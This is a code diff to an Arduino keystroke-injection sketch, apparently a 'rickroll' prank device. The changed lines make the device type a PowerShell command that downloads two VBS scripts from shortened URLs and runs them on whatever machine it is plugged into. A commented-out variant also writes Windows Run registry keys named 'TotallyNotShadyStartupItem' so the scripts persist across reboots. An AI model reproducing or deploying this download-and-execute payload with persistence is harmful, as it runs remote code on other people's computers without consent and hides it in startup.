@@ -1,4 +1,4 @@
-/**
+/*
  *  Author: Sam van der Kris
  *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
  */
@@ -37,8 +37,8 @@ void runPayload() {
 	delay(200);
 
 	// Download and run rickroll.vbs and exit when done
-	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/mdqw6T','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
-	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/mdqw6T','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\\volup.vbs && exit");
+	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
+	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/2ahFyH','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\\volup.vbs && exit");
 	delay(100);
 	typeKey(KEY_RETURN);
 
